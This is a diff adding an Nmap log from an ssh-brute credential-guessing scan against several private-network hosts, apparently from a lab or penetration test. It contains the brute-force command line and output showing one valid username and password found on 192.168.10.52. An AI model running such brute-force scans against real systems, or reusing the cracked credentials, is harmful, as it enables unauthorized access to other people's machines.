@@ -1,0 +1,30 @@
+# Nmap 7.91 scan initiated Sun Jan  7 20:20:02 2024 as: nmap -p 22 --script ssh-brute --script-args userdb=user.lst,passdb=pass.lst -iL ip.txt -oN acconts.txt
+Nmap scan report for 192.168.10.50
+Host is up (0.0022s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-brute: 
+|   Accounts: No valid accounts found
+|_  Statistics: Performed 2 guesses in 5 seconds, average tps: 0.4
+
+Nmap scan report for 192.168.10.52
+Host is up (0.013s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-brute: 
+|   Accounts: 
+|     vector:H3lpd3sk - Valid credentials
+|_  Statistics: Performed 2 guesses in 5 seconds, average tps: 0.4
+
+Nmap scan report for 192.168.10.111
+Host is up (0.0027s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-brute: 
+|   Accounts: No valid accounts found
+|_  Statistics: Performed 2 guesses in 4 seconds, average tps: 0.5
+
+# Nmap done at Sun Jan  7 20:20:10 2024 -- 4 IP addresses (3 hosts up) scanned in 7.71 seconds
